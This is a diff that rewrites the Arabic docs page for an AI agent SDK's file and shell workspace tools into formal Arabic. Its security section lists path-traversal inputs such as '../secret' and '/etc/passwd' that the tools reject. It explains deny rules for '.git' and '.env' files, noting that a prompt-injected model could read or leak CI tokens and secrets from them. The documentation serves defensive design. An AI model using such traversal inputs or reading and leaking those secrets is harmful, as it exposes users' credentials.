@@ -3,7 +3,7 @@ title: "Workspace tools"
 ---
 {/* Generated from docs/workspace-tools.md in LinuxDevil/agent-sdk by scripts/sync-sdk-docs.mjs. Do not edit here. */}
 
-الـworkspace tools تعطي الـagent نظام ملفات وshell، فيقدر يشتغل كـcoding agent بأسلوب Claude Code. الأدوات نفسها لا تستخدم `node:fs` ولا `node:child_process`، بل تنادي واجهتين صغيرتين: `FsProvider` و`ShellProvider`. لذلك نفس الأدوات تشتغل على مجلد محلي، أو على شجرة ملفات في الذاكرة أثناء الاختبارات، أو على container في Docker، أو على sandbox بعيد مثل E2B أو Daytona أو Cloudflare. لشرح عملي كامل، راجع [ابنِ coding agent](/ar/build-a-coding-agent).
+تعطي الـworkspace tools الـagent نظام ملفات وshell، فيستطيع العمل كـcoding agent بأسلوب Claude Code. الأدوات نفسها لا تستخدم `node:fs` ولا `node:child_process`، بل تستدعي واجهتين صغيرتين: `FsProvider` و`ShellProvider`. لذلك تعمل الأدوات نفسها على مجلد محلي، أو على شجرة ملفات في الذاكرة أثناء الاختبارات، أو على container في Docker، أو على sandbox بعيد مثل E2B أو Daytona أو Cloudflare. لشرح عملي كامل، راجع [ابنِ coding agent](/ar/build-a-coding-agent).
 
 ```ts
 import { createAgent, NodeWorkspace, createFsTools, createShellTool } from 'lousho';
@@ -23,7 +23,7 @@ if (paused.finishReason === 'awaiting-approval') {
 }
 ```
 
-`send()` ترجع بـ`finishReason: 'awaiting-approval'`، و`agent.approvals.resolve()` تنفّذ الأمر (أو ترفضه) ويكمل الـrun (راجع [Approvals](/ar/approvals)). إذا تبي بعض الأوامر تشتغل بدون سؤال، مرّر `needsApproval: false` مع قائمة `allow`، أو `needsApproval` كدالة ترجع `false` للأوامر اللي تثق فيها.
+تعود `send()` بـ`finishReason: 'awaiting-approval'`، وتنفّذ `agent.approvals.resolve()` الأمر (أو ترفضه) ويكمل الـrun (راجع [Approvals](/ar/approvals)). إذا أردت أن تعمل بعض الأوامر بدون سؤال، فمرّر `needsApproval: false` مع قائمة `allow`، أو `needsApproval` كدالة تُرجع `false` للأوامر التي تثق بها.
 
 ```ts
 import { createAgent, NodeWorkspace, createFsTools, createShellTool } from 'lousho';
@@ -41,11 +41,11 @@ const agent = createAgent({
 const result = await agent.send('Fix the failing test in src/math.test.ts');
 ```
 
-النص العادي مثل `'npm test'` كان سيسمح أيضًا بـ`npm test -- <anything>`، وبرامج كثيرة عندها flags تكتب ملفات (`git diff --output=../x` و`node --test --test-reporter-destination=../x`). راجع القواعد أدناه.
+النص العادي مثل `'npm test'` كان سيسمح أيضًا بـ`npm test -- <anything>`، وبرامج كثيرة لديها flags تكتب ملفات (`git diff --output=../x` و`node --test --test-reporter-destination=../x`). راجع القواعد أدناه.
 
 ### متقدم: الـexecutor API
 
-`createAgent()` تشغّل `AgentExecutor` تحتها (راجع [executor API](/ar/executor-api)). إذا تبي تملك الربط بنفسك، سجّل الأدوات في `ToolRegistry` ونادِ الـexecutor. التوقف هو نفسه، و`resumeAfterApproval(...)` هي اللي تناديها `agent.approvals.resolve()` لما يوافق بشر:
+تشغّل `createAgent()` الـ`AgentExecutor` في الخلفية (راجع [executor API](/ar/executor-api)). إذا أردت أن تتولى الربط بنفسك، فسجّل الأدوات في `ToolRegistry` واستدعِ الـexecutor. التوقف هو نفسه، و`resumeAfterApproval(...)` هي ما تستدعيه `agent.approvals.resolve()` عندما يوافق إنسان:
 
 ```ts
 import { AgentExecutor, ToolRegistry } from 'lousho/executor';
@@ -62,41 +62,41 @@ const paused = await AgentExecutor.execute({ agent, input, provider, toolRegistr
 
 ## الأدوات
 
-`createFsTools(fs, options?)` ترجع أدوات `defineTool` هذه:
+تُرجع `createFsTools(fs, options?)` أدوات `defineTool` التالية:
 
-| الأداة       | المعاملات                                         | ترجع |
+| الأداة       | المعاملات                                         | تُرجع |
 | ------------ | ------------------------------------------------- | ------- |
-| `read_file`  | `path`، و`offset` اختياري (رقم السطر يبدأ من 1)، و`limit` | أسطر مرقّمة (`"    12\tcode"`). إذا انقطع الناتج، آخر سطر يوضح أي الأسطر عُرضت وقيمة `offset` اللي تكمل منها. الملفات فوق 10 MB تُرفض. |
+| `read_file`  | `path`، و`offset` اختياري (رقم السطر يبدأ من 1)، و`limit` | أسطر مرقّمة (`"    12\tcode"`). إذا اقتُطع الناتج، يوضح آخر سطر الأسطر التي عُرضت وقيمة `offset` التي يُستكمل منها. وتُرفض الملفات التي تتجاوز 10 MB. |
 | `write_file` | `path` و`content`                                 | تنشئ الملف أو تكتب فوقه، وتنشئ المجلدات الأب الناقصة. |
-| `edit_file`  | `path` و`old_string` و`new_string`، و`replace_all` اختياري | تستبدل النص المطابق حرفيًا. تفشل برسالة يقدر الـmodel يتصرف عليها إذا كان `old_string` غير موجود (مع تلميح عن نهايات الأسطر CRLF)، أو ظهر أكثر من مرة بدون `replace_all`. إذا كان `old_string` غير موجود لكن `new_string` غير فارغ وموجود في الملف، فالتعديل مطبَّق أصلًا (استدعاء أُعيد تشغيله بعد crash): تنجح بدون كتابة وتوضح ذلك. ترفض الملف اللي مو UTF-8 (latin1 وWindows-1252 وUTF-16) وتتركه كما هو، إذا كان عند الـprovider `readFileBytes` (مثل `NodeWorkspace`). الـBOM الخاص بـUTF-8 يبقى. |
+| `edit_file`  | `path` و`old_string` و`new_string`، و`replace_all` اختياري | تستبدل النص المطابق حرفيًا. تفشل برسالة يستطيع الـmodel التصرف بناءً عليها إذا كان `old_string` غير موجود (مع تلميح عن نهايات الأسطر CRLF)، أو ظهر أكثر من مرة بدون `replace_all`. وإذا كان `old_string` غير موجود لكن `new_string` غير فارغ وموجود في الملف، فالتعديل مطبَّق مسبقًا (استدعاء أُعيد تشغيله بعد crash): تنجح بدون كتابة وتوضح ذلك. وترفض الملف الذي ليس UTF-8 (latin1 وWindows-1252 وUTF-16) وتتركه كما هو، إذا كان لدى الـprovider `readFileBytes` (مثل `NodeWorkspace`). ويبقى الـBOM الخاص بـUTF-8. |
 | `list_dir`   | `path` اختياري                                    | مدخلات مرتبة؛ أسماء المجلدات تنتهي بـ`/`. |
-| `glob`       | `pattern`، و`path` اختياري                      | مسارات الملفات المطابقة، مرتبة. `*` تبقى داخل مجلد واحد، `**` تعبر المجلدات، زائد `?` و`[abc]` و`{a,b}`. |
-| `grep`       | `pattern` (regex بصيغة JavaScript)، و`path` و`glob` و`ignore_case` اختيارية | `path:line: text` لكل سطر مطابق. الـregex غير الصالح، أو اللي فيه تكرار متداخل مثل `(a+)+`، يظهر كخطأ أداة. تُتخطى الملفات الثنائية وما يتجاوز 2 MB. |
+| `glob`       | `pattern`، و`path` اختياري                      | مسارات الملفات المطابقة، مرتبة. `*` تبقى داخل مجلد واحد، و`**` تعبر المجلدات، إضافةً إلى `?` و`[abc]` و`{a,b}`. |
+| `grep`       | `pattern` (regex بصيغة JavaScript)، و`path` و`glob` و`ignore_case` اختيارية | `path:line: text` لكل سطر مطابق. الـregex غير الصالح، أو الذي يحتوي تكرارًا متداخلًا مثل `(a+)+`، يظهر كخطأ أداة. وتُتخطى الملفات الثنائية وما يتجاوز 2 MB. |
 
 | الخيار            | الافتراضي                   | المعنى |
 | ----------------- | --------------------------- | ------- |
 | `readOnly`        | `false`                     | ينشئ `read_file` و`list_dir` و`glob` و`grep` فقط. |
 | `needsApproval`   | لا شيء                      | لكل أداة على حدة: `{ write_file: true, edit_file: ({ path }) => !path.startsWith('src/') }`. |
-| `maxReadLines`    | 2000                        | أكثر عدد أسطر ترجعه `read_file` في الاستدعاء الواحد. |
-| `maxOutputChars`  | 50,000                      | أكثر عدد محارف ترجعه الأداة في الاستدعاء الواحد. |
-| `maxResults`      | 200                         | أكثر عدد مسارات أو تطابقات أو مدخلات ترجعه `glob` و`grep` و`list_dir`. |
-| `maxFilesScanned` | 20,000                      | أكثر عدد ملفات تمرّ عليها `glob` أو `grep` أثناء البحث. |
-| `grepTimeoutMs`   | 10,000                      | عدد الميلي ثانية اللي تقدر `grep` تصرفها في مطابقة الـregex عبر كل الملفات؛ وقت قراءة الملفات ما يُحسب. النمط البطيء يتوقف بخطأ يذكر كم ملف فُحص. |
+| `maxReadLines`    | 2000                        | أكبر عدد من الأسطر تُرجعه `read_file` في الاستدعاء الواحد. |
+| `maxOutputChars`  | 50,000                      | أكبر عدد من المحارف تُرجعه الأداة في الاستدعاء الواحد. |
+| `maxResults`      | 200                         | أكبر عدد من المسارات أو التطابقات أو المدخلات تُرجعه `glob` و`grep` و`list_dir`. |
+| `maxFilesScanned` | 20,000                      | أكبر عدد من الملفات تمرّ عليها `glob` أو `grep` أثناء البحث. |
+| `grepTimeoutMs`   | 10,000                      | عدد الميلي ثانية التي تستطيع `grep` إنفاقها في مطابقة الـregex عبر كل الملفات؛ ولا يُحتسب وقت قراءة الملفات. يتوقف النمط البطيء بخطأ يذكر عدد الملفات التي فُحصت. |
 | `ignore`          | `['.git', 'node_modules']`  | أسماء مجلدات تتخطاها `glob` و`grep`. |
-| `deny`            | `['.git', '.env', '.env.*']` | أسماء مدخلات ما تقرأها أي أداة ولا تعرضها ولا تبحث فيها ولا تكتب فيها، على أي عمق. الـ`*` في آخر الاسم يعني بادئة. المسار اللي يمر عبر واحد منها خطأ أداة. `[]` يوقف الفحص. راجع [نموذج الأمان](#نموذج-الأمان). |
-| `checkpoints`     | لا شيء                      | كائن `WorkspaceCheckpoints`: يحتفظ بنسخة احتياطية من كل ملف تغيّره `write_file` و`edit_file`، لتقدر ترجّع التغييرات (انظر أدناه). |
+| `deny`            | `['.git', '.env', '.env.*']` | أسماء مدخلات لا تقرؤها أي أداة ولا تعرضها ولا تبحث فيها ولا تكتب فيها، على أي عمق. والـ`*` في آخر الاسم تعني بادئة. والمسار الذي يمر عبر واحد منها خطأ أداة. و`[]` توقف الفحص. راجع [نموذج الأمان](#نموذج-الأمان). |
+| `checkpoints`     | لا شيء                      | كائن `WorkspaceCheckpoints`: يحتفظ بنسخة احتياطية من كل ملف تغيّره `write_file` و`edit_file`، لكي تستطيع التراجع عن التغييرات (انظر أدناه). |
 
-`createShellTool(shell, options?)` يرجع أداة واحدة اسمها `shell`، تأخذ `command` و`timeout_ms` اختياري، وترجع `{ exitCode, stdout, stderr }`. إذا انقتل الأمر، تحمل النتيجة أيضًا `timedOut: true` أو `aborted: true` مع `note` توضح السبب.
+يُرجع `createShellTool(shell, options?)` أداة واحدة اسمها `shell`، تأخذ `command` و`timeout_ms` اختياريًا، وتُرجع `{ exitCode, stdout, stderr }`. وإذا قُتل الأمر، تحمل النتيجة أيضًا `timedOut: true` أو `aborted: true` مع `note` توضح السبب.
 
 | الخيار             | الافتراضي   | المعنى |
 | ------------------ | --------- | ------- |
 | `needsApproval`    | `true`    | `true` أو `false`، أو predicate على نص الأمر. |
-| `allow`            | لا شيء    | إذا عيّنته، لا ينفَّذ إلا الأوامر المطابقة. النمط النصي يسمح بالأمر مع معاملات تبقى داخل الـworkspace وما تحتاج توسيع `$`/`{}`؛ راجع القواعد أدناه. |
-| `deny`             | لا شيء    | الأوامر المطابقة تُرفض. |
-| `defaultTimeoutMs` | 120,000   | الـtimeout لما الـmodel ما يمرّر `timeout_ms`. |
-| `maxTimeoutMs`     | 600,000   | أي `timeout_ms` أكبر من هذا ينزل لهذه القيمة. |
-| `maxOutputChars`   | 30,000    | لكل stream. بعد هذا الحد يبقى أول الناتج وآخره والوسط يُستبدل بعلامة. |
-| `cwd`، `env`       | لا شيء    | مجلد العمل (بالنسبة للـworkspace) ومتغيرات إضافية لكل أمر. |
+| `allow`            | لا شيء    | إذا عيّنته، لا تُنفَّذ إلا الأوامر المطابقة. يسمح النمط النصي بالأمر مع معاملات تبقى داخل الـworkspace ولا تحتاج إلى توسيع `$`/`{}`؛ راجع القواعد أدناه. |
+| `deny`             | لا شيء    | تُرفض الأوامر المطابقة. |
+| `defaultTimeoutMs` | 120,000   | الـtimeout عندما لا يمرّر الـmodel `timeout_ms`. |
+| `maxTimeoutMs`     | 600,000   | أي `timeout_ms` أكبر من هذا يُخفَّض إلى هذه القيمة. |
+| `maxOutputChars`   | 30,000    | لكل stream. بعد هذا الحد يبقى أول الناتج وآخره ويُستبدل الوسط بعلامة. |
+| `cwd`، `env`       | لا شيء    | مجلد العمل (بالنسبة إلى الـworkspace) ومتغيرات إضافية لكل أمر. |
 | `name`             | `'shell'` | اسم الأداة. |
 
 ```ts
@@ -109,9 +109,9 @@ const shell = createShellTool(new NodeWorkspace({ root: '.' }), {
 });
 ```
 
-إلغاء الـrun (بـ`agent.send(input, { signal })` أو `AgentExecutor.execute({ signal })`) يقتل الأمر الشغال وكل العمليات اللي بدأها: كمجموعة عمليات في Linux وmacOS، وبـ`taskkill /T` في Windows.
+إلغاء الـrun (بـ`agent.send(input, { signal })` أو `AgentExecutor.execute({ signal })`) يقتل الأمر الجاري وكل العمليات التي بدأها: كمجموعة عمليات في Linux وmacOS، وبـ`taskkill /T` في Windows.
 
-إذا تبي ترجّع اللي عمله الـagent بالملفات، مرّر `WorkspaceCheckpoints` إلى `createFsTools(fs, { checkpoints })`. قبل ما تغيّر `write_file` أو `edit_file` أي ملف، يُسجَّل محتواه القديم (وبتات صلاحياته إذا عند الـprovider `getMode` و`chmod`، مثل `NodeWorkspace`) تحت session الـrun ورقم الـturn. الـturn هو رقم رسالة المستخدم اللي يجاوب عليها الـtool call، ويبدأ من 0: أول `session.send()` هو turn 0، واللي بعده turn 1. `checkpoints.list({ sessionId })` ترجع الـturns اللي صار فيها تغيير والمسارات اللي تغيّرت في كل واحد. و`checkpoints.rewind(toTurn, { sessionId })` يرجّع كل ملف تغيّر في turn `toTurn` أو بعده لحالته قبل `toTurn`: الملف اللي أنشأه الـagent يُحذف، واللي عدّله أو كتب فوقه يسترجع محتواه. مع `dryRun: true` ما يتغيّر شيء ويرجع نفس التقرير.
+إذا أردت التراجع عمّا فعله الـagent بالملفات، فمرّر `WorkspaceCheckpoints` إلى `createFsTools(fs, { checkpoints })`. قبل أن تغيّر `write_file` أو `edit_file` أي ملف، يُسجَّل محتواه القديم (وبتات صلاحياته إذا كان لدى الـprovider `getMode` و`chmod`، مثل `NodeWorkspace`) تحت session الـrun ورقم الـturn. والـturn هو رقم رسالة المستخدم التي يجيب عنها الـtool call، ويبدأ من 0: أول `session.send()` هو turn 0، والذي يليه turn 1. تُرجع `checkpoints.list({ sessionId })` الـturns التي حدث فيها تغيير والمسارات التي تغيّرت في كل منها. ويُعيد `checkpoints.rewind(toTurn, { sessionId })` كل ملف تغيّر في turn `toTurn` أو بعده إلى حالته قبل `toTurn`: يُحذف الملف الذي أنشأه الـagent، ويستعيد الملف الذي عدّله أو كتب فوقه محتواه. ومع `dryRun: true` لا يتغيّر شيء ويُرجع التقرير نفسه.
 
 ```ts
 import { createAgent, createFsTools, MemoryWorkspace, WorkspaceCheckpoints } from 'lousho';
@@ -142,48 +142,48 @@ await checkpoints.rewind(0, { sessionId: session.id });
 console.log(workspace.snapshot()); // { 'notes.md': '# Notes\n' }
 ```
 
-الملف اللي محتواه لم يعد آخر ما كتبه الـagent فيه تغيّر بشيء ثاني (إنت، أو محرّر، أو أداة `shell`)، فيتركه الـrewind ويبلّغ عنه في `skipped` كـ`'changed-since'`؛ مرّر `force: true` إذا تبي تسترجعه على أي حال. والمسار الموجود لكنه مو ملف (مجلد مثلًا) يُتخطى كـ`'not-a-file'`. كل مسار يُفحص قبل كتابة أي شيء، والاستعادة تمرّ عبر نفس الـprovider، فيبقيها `NodeWorkspace` داخل الـroot، والـsymlinks ضمن ذلك. الـrewind الفعلي ينسى بعدها النسخ الاحتياطية للـturns اللي رجّعها، بما فيها نسخ الملفات المتخطّاة، فالـrewind الثاني ما يسوي شيء: شوف الـdry run أولًا. المجلدات اللي أنشأها الـagent تبقى (فارغة) بعد حذف ملفاتها. المحادثة نفسها لا تُرجَّع؛ إذا تبي تفرّعها كمان، اعمل fork للـsession بـ`session.fork({ fromStep })` (راجع [تفريع جلسة](/ar/sessions#forking-a-session)؛ حقل `turn` للخطوة في `session.history()` هو رقم الـturn المستخدم هنا)، أو اعمل fork لـrun واحد بـ`agent.fork()` (راجع [Fork and replay](/ar/durable-execution#fork-و-replay)).
+الملف الذي لم يعد محتواه آخر ما كتبه الـagent فيه قد غيّره شيء آخر (أنت، أو محرّر، أو أداة `shell`)، فيتركه الـrewind ويبلّغ عنه في `skipped` كـ`'changed-since'`؛ مرّر `force: true` إذا أردت استعادته على أي حال. والمسار الموجود لكنه ليس ملفًا (مجلد مثلًا) يُتخطى كـ`'not-a-file'`. يُفحص كل مسار قبل كتابة أي شيء، وتمرّ الاستعادة عبر الـprovider نفسه، فيُبقيها `NodeWorkspace` داخل الـroot، بما في ذلك الـsymlinks. وبعد الـrewind الفعلي تُنسى النسخ الاحتياطية للـturns التي أعادها، بما فيها نسخ الملفات المتخطّاة، فلا يفعل الـrewind الثاني شيئًا: راجع الـdry run أولًا. وتبقى المجلدات التي أنشأها الـagent (فارغة) بعد حذف ملفاتها. ولا يُتراجع عن المحادثة نفسها؛ إذا أردت تفريعها أيضًا، فاعمل fork للـsession بـ`session.fork({ fromStep })` (راجع [تفريع جلسة](/ar/sessions#forking-a-session)؛ حقل `turn` للخطوة في `session.history()` هو رقم الـturn المستخدم هنا)، أو اعمل fork لـrun واحد بـ`agent.fork()` (راجع [Fork and replay](/ar/durable-execution#fork-و-replay)).
 
-النسخ الاحتياطية تنجو من الـcrash. النسخة تُخزَّن قبل كتابة الملف، فالعملية اللي تنقتل بين الخطوتين ما تخسر شيء: الملف ما زال فيه المحتوى المنسوخ، والـrewind يعتبره ما فيه شيء للتراجع عنه. الـtool call اللي كان شغال لما ماتت العملية يشتغل من جديد عند الاستئناف (راجع [At-least-once tools](/ar/durable-execution#at-least-once-tools-خلّي-الـ-side-effects-idempotent))؛ وإعادة التشغيل تلقى نسخة الـturn لذلك المسار وتحتفظ فيها، فيرجّع `rewind()` المحتوى من قبل المحاولة الأولى، مو الكتابة نص المكتملة اللي سواها الـagent نفسه. و`write_file` أو `edit_file` اللي كانت ستترك الملف كما هو (نفس المحتوى، أو تعديل مطبَّق أصلًا) ما تسجّل ولا تكتب شيء.
+تنجو النسخ الاحتياطية من الـcrash. تُخزَّن النسخة قبل كتابة الملف، فالعملية التي تُقتل بين الخطوتين لا تخسر شيئًا: لا يزال الملف يحتوي على المحتوى المنسوخ، ويعتبر الـrewind أنه لا يوجد فيه ما يُتراجع عنه. والـtool call الذي كان يعمل عندما توقفت العملية يُعاد تشغيله عند الاستئناف (راجع [At-least-once tools](/ar/durable-execution#at-least-once-tools-اجعل-الـ-side-effects-idempotent))؛ وتجد إعادة التشغيل نسخة الـturn لذلك المسار وتحتفظ بها، فيُعيد `rewind()` المحتوى الذي كان قبل المحاولة الأولى، لا الكتابة نصف المكتملة التي أجراها الـagent نفسه. و`write_file` أو `edit_file` التي كانت ستترك الملف كما هو (المحتوى نفسه، أو تعديل مطبَّق مسبقًا) لا تسجّل شيئًا ولا تكتب شيئًا.
 
-اللي ما يُتتبَّع: التغييرات اللي تسويها أداة `shell`، والملفات اللي يكتبها sub-agent بأدوات ملفات خاصة فيه (إلا إذا أخذ نفس كائن `WorkspaceCheckpoints`، فتُسجَّل وقتها تحت session id الخاص فيه)، والملفات الأكبر من `maxFileBytes` (الافتراضي 1,000,000 بايت): تُبلَّغ كـ`'too-large'` ولا تُحذف أبدًا. بدون session، كل `agent.send()` هو turn 0 في الـsession `'default'`، فاستخدم `agent.session()` إذا تبي ترجّع حسب الـturn. الـturns تُعدّ في السجل اللي يشوفه الـmodel، فبعد ما يحذف الـcompaction رسائل مستخدم قديمة يتزحزح ترقيم الـturns اللاحقة.
+ما لا يُتتبَّع: التغييرات التي تجريها أداة `shell`، والملفات التي يكتبها sub-agent بأدوات ملفات خاصة به (إلا إذا أخذ كائن `WorkspaceCheckpoints` نفسه، فتُسجَّل حينها تحت session id الخاص به)، والملفات الأكبر من `maxFileBytes` (الافتراضي 1,000,000 بايت): تُبلَّغ كـ`'too-large'` ولا تُحذف أبدًا. وبدون session، يكون كل `agent.send()` هو turn 0 في الـsession `'default'`، فاستخدم `agent.session()` إذا أردت التراجع حسب الـturn. وتُعدّ الـturns في السجل الذي يراه الـmodel، فبعد أن يحذف الـcompaction رسائل مستخدم قديمة يتغيّر ترقيم الـturns اللاحقة.
 
-النسخ الاحتياطية ما تكبر بلا حد. يُحتفظ فقط بأحدث `maxTurns` turn لكل session (الافتراضي 20؛ و`rewind()` لـturn أقدم يرمي خطأ)؛ والملف الأكبر من `maxFileBytes` لا يُنسخ؛ وإذا كتب turn واحد نفس المسار عدة مرات، أول كتابة فقط تحتفظ بالمحتوى القديم (الكتابات اللاحقة تحتفظ بـhash لسجل التدقيق)؛ والـrewind يسقط النسخ اللي رجّعها؛ و`checkpoints.clear({ sessionId })` ينسى session كاملة. الـstore الافتراضي يحتفظ بالنسخ في الذاكرة. و`new FileWorkspaceCheckpointStore(dir)` يكتب ملف JSON واحد لكل session كتابة ذرّية (ملف مؤقت ثم rename)، فيشتغل الـrewind بعد إعادة التشغيل؛ نفّذ `WorkspaceCheckpointStore` إذا تبي تحفظها في مكان آخر. محتوى الملفات يعيش في الـstore فقط، ولا يظهر أبدًا في الأحداث أو الـtraces.
+لا تكبر النسخ الاحتياطية بلا حد. يُحتفظ فقط بأحدث `maxTurns` turn لكل session (الافتراضي 20؛ و`rewind()` إلى turn أقدم يرمي خطأ)؛ ولا يُنسخ الملف الأكبر من `maxFileBytes`؛ وإذا كتب turn واحد المسار نفسه عدة مرات، فإن أول كتابة فقط تحتفظ بالمحتوى القديم (الكتابات اللاحقة تحتفظ بـhash لسجل التدقيق)؛ ويُسقط الـrewind النسخ التي أعادها؛ وينسى `checkpoints.clear({ sessionId })` session كاملة. يحتفظ الـstore الافتراضي بالنسخ في الذاكرة. ويكتب `new FileWorkspaceCheckpointStore(dir)` ملف JSON واحدًا لكل session كتابةً ذرّية (ملف مؤقت ثم rename)، فيعمل الـrewind بعد إعادة التشغيل؛ نفّذ `WorkspaceCheckpointStore` إذا أردت حفظها في مكان آخر. ويعيش محتوى الملفات في الـstore فقط، ولا يظهر أبدًا في الأحداث أو الـtraces.
 
 ## نموذج الأمان
 
-اقرأ هذا قبل ما تعطي model وصولًا لـshell.
+اقرأ هذا قبل أن تعطي model وصولًا إلى shell.
 
 ### ما يُفرَض
 
-**المسارات تبقى داخل الـroot.** قبل لمس أي ملف، `NodeWorkspace` (و`MemoryWorkspace` كذلك) يطبّق normalize على كل مسار. هذه الحالات تُرفض على كل المنصات:
+**تبقى المسارات داخل الـroot.** قبل لمس أي ملف، يطبّق `NodeWorkspace` (و`MemoryWorkspace` كذلك) normalize على كل مسار. وتُرفض هذه الحالات على كل المنصات:
 
-- `..` اللي يطلع فوق الـroot (`../secret` و`src/../../secret`)
-- المسارات المطلقة (`/etc/passwd`، وحتى المسار المطلق اللي يشير لداخل الـroot)
+- `..` الذي يخرج فوق الـroot (`../secret` و`src/../../secret`)
+- المسارات المطلقة (`/etc/passwd`، وحتى المسار المطلق الذي يشير إلى داخل الـroot)
 - حروف الأقراص في Windows (`C:\Windows` و`C:secret`)
 - مسارات UNC والمسارات الممتدة (`\\server\share` و`//server/share` و`\\?\C:\`)
 - بايتات NUL
 
-الشرطات المائلة العكسية تُحسب فواصل في كل مكان، فخلط الفواصل (`src/..\..\secret`) ما يقدر يخفي `..`. وفي Windows تُرفض أيضًا `:` (alternate data streams)، وأسماء الأجهزة المحجوزة (`CON` و`NUL` و`COM1` ...)، والمقاطع المكوّنة من نقاط ومسافات فقط (Windows يحذف النقاط والمسافات من آخر الاسم، فـ`.. ` كانت ستتصرف كـ`..`).
+تُحسب الشرطات المائلة العكسية فواصل في كل مكان، فلا يستطيع خلط الفواصل (`src/..\..\secret`) إخفاء `..`. وفي Windows تُرفض أيضًا `:` (alternate data streams)، وأسماء الأجهزة المحجوزة (`CON` و`NUL` و`COM1` ...)، والمقاطع المكوّنة من نقاط ومسافات فقط (يحذف Windows النقاط والمسافات من آخر الاسم، فكانت `.. ` ستتصرف كـ`..`).
 
-**الـsymlinks ما تقدر تطلع.** بعد هذا الفحص، يحلّ `NodeWorkspace` المسار بـ`realpath`. إذا المسار غير موجود بعد، يحلّ أعمق جزء موجود منه. والنتيجة لازم تبقى داخل المسار الحقيقي للـroot نفسه. يعني:
+**لا تستطيع الـsymlinks الخروج.** بعد هذا الفحص، يحلّ `NodeWorkspace` المسار بـ`realpath`. وإذا لم يكن المسار موجودًا بعد، يحلّ أعمق جزء موجود منه. ويجب أن تبقى النتيجة داخل المسار الحقيقي للـroot نفسه. أي أن:
 
-- رابط داخل الـroot يشير لخارجه يُرفض للقراءة، وللكتابة على ملفات غير موجودة بعد (`escape-link/new.txt`).
-- رابط هدفه غير موجود لا يُتبع أبدًا، لأن الكتابة عبره ممكن تنشئ ملفًا خارج الـroot.
-- `glob` و`grep` لا تتبعان الروابط أبدًا أثناء المرور على الشجرة.
-- `rm` على رابط تحذف الرابط نفسه وتترك هدفه.
+- الرابط داخل الـroot الذي يشير إلى خارجه يُرفض للقراءة، وللكتابة على ملفات غير موجودة بعد (`escape-link/new.txt`).
+- الرابط الذي هدفه غير موجود لا يُتبع أبدًا، لأن الكتابة عبره قد تنشئ ملفًا خارج الـroot.
+- لا تتبع `glob` و`grep` الروابط أبدًا أثناء المرور على الشجرة.
+- تحذف `rm` على رابطٍ الرابطَ نفسه وتترك هدفه.
 
-**الكتابة ذرّية.** `NodeWorkspace` يكتب الملف (ولـ`write_file` و`edit_file` كمان) في ملف مؤقت بنفس المجلد، يعمل له flush ثم rename فوق الهدف، فالعملية اللي تنقتل نص الكتابة تترك الملف القديم أو الجديد، وما تتركه أبدًا نص مكتوب. الملف المستبدَل يحتفظ ببتات صلاحياته، والملف read-only ما زال يُرفض.
+**الكتابة ذرّية.** يكتب `NodeWorkspace` الملف (ولـ`write_file` و`edit_file` أيضًا) في ملف مؤقت في المجلد نفسه، ثم يعمل له flush ثم rename فوق الهدف، فالعملية التي تُقتل في منتصف الكتابة تترك الملف القديم أو الجديد، ولا تتركه أبدًا مكتوبًا جزئيًا. ويحتفظ الملف المستبدَل ببتات صلاحياته، ولا يزال الملف read-only يُرفض.
 
-**أدوات الملفات تبتعد عن `.git`.** الـcheckout غالبًا فيه credentials في `.git/config`: `actions/checkout` يحفظ token الـjob هناك كـ`http.https://github.com/.extraheader = AUTHORIZATION: basic ...`، والـmodel اللي يقدر يقراه يقدر يسرّب الـtoken في جوابه. وفي git worktree، `.git` ملف فيه مسار الـhost للـrepository الرئيسي. لذلك `read_file` و`list_dir` و`glob` و`grep` و`write_file` و`edit_file` ترفض أي مسار فيه مقطع `.git`، على أي عمق (`.git/config` و`sub/.git`)، و`glob` و`grep` و`list_dir` تستبعد مدخلات `.git` من نتائجها، حتى مع `ignore: []`. الفحص يشتغل بعد الـnormalize، فـ`./.git` و`a/../.git` و`.git\config` و`.git/` تُرفض كمان. الأسماء تُقارن بدون حساسية لحالة الأحرف (`.GIT`)، والنقاط والمسافات في آخر الاسم تُتجاهل (Windows يفتح `.git.` كـ`.git`)، وفي Windows تُرفض الأسماء القصيرة بصيغة 8.3 مثل `GIT~1`. `.gitignore` و`.github/` ما يتأثرون.
+**تبتعد أدوات الملفات عن `.git`.** غالبًا ما يحتوي الـcheckout على credentials في `.git/config`: يحفظ `actions/checkout` الـtoken الخاص بالـjob هناك كـ`http.https://github.com/.extraheader = AUTHORIZATION: basic ...`، والـmodel الذي يستطيع قراءته يستطيع تسريب الـtoken في إجابته. وفي git worktree، يكون `.git` ملفًا فيه مسار الـhost للـrepository الرئيسي. لذلك ترفض `read_file` و`list_dir` و`glob` و`grep` و`write_file` و`edit_file` أي مسار فيه مقطع `.git`، على أي عمق (`.git/config` و`sub/.git`)، وتستبعد `glob` و`grep` و`list_dir` مدخلات `.git` من نتائجها، حتى مع `ignore: []`. ويعمل الفحص بعد الـnormalize، فتُرفض أيضًا `./.git` و`a/../.git` و`.git\config` و`.git/`. وتُقارن الأسماء بدون حساسية لحالة الأحرف (`.GIT`)، وتُتجاهل النقاط والمسافات في آخر الاسم (يفتح Windows `.git.` كـ`.git`)، وفي Windows تُرفض الأسماء القصيرة بصيغة 8.3 مثل `GIT~1`. ولا تتأثر `.gitignore` و`.github/`.
 
-القائمة الافتراضية تشمل كمان `.env` و`.env.*` (`.env.local`،
-`.env.production`)، فالـmodel اللي تعرّض لـprompt injection ما يقدر يقرا الأسرار منها.
-`.env.example` و`.env.sample` و`.env.template` تظل قابلة للقراءة. المدخل اللي
-ينتهي بـ`*` مطابقة بادئة تستثني لواحق القوالب الثلاث هذي.
-الـ`deny` اللي تمرّره **يستبدل** القيم الافتراضية، ما يضيف عليها: اكتب
+تشمل القائمة الافتراضية أيضًا `.env` و`.env.*` (`.env.local`،
+`.env.production`)، فلا يستطيع الـmodel الذي تعرّض لـprompt injection قراءة الأسرار منها.
+وتبقى `.env.example` و`.env.sample` و`.env.template` قابلة للقراءة. والمدخل الذي
+ينتهي بـ`*` مطابقة بادئة تستثني لواحق القوالب الثلاث هذه.
+والـ`deny` الذي تمرّره **يستبدل** القيم الافتراضية، ولا يُضاف إليها: اكتب
 `.git` و`.env` من جديد، مثلًا `deny: ['.git', '.env', '.env.*',
-'secrets']` (أسماء مدخلات، مو مسارات)، أو مرّر `deny: []` لإيقاف الفحص.
+'secrets']` (أسماء مدخلات، لا مسارات)، أو مرّر `deny: []` لإيقاف الفحص.
 
 ```ts
 import { createFsTools, NodeWorkspace } from 'lousho';
@@ -192,13 +192,13 @@ const workspace = new NodeWorkspace({ root: '.' });
